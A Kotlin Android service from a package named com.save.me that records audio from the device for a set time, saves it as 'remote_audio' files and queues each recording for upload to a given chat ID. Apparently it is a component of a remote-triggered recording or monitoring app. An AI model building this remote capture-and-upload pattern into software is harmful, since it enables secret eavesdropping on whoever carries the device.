package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Environment
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import java.io.File

class AudioService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(context: Context, duration: Int = 120, chatId: String? = null) {
            val intent = Intent(context, AudioService::class.java).apply {
                putExtra(EXTRA_DURATION, duration)
                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
            }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val duration = intent?.getIntExtra(EXTRA_DURATION, 120) ?: 120
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
        scope.launch {
            try {
                val file = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_audio_${System.currentTimeMillis()}.m4a")
                AudioBackgroundHelper.recordAudio(this@AudioService, file, duration)
                Log.d("AudioService", "Saved audio to ${file.absolutePath}")
                if (chatId != null) {
                    UploadManager.queueUpload(file, chatId, "audio")
                }
            } catch (e: Exception) {
                Log.e("AudioService", "Error: $e")
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}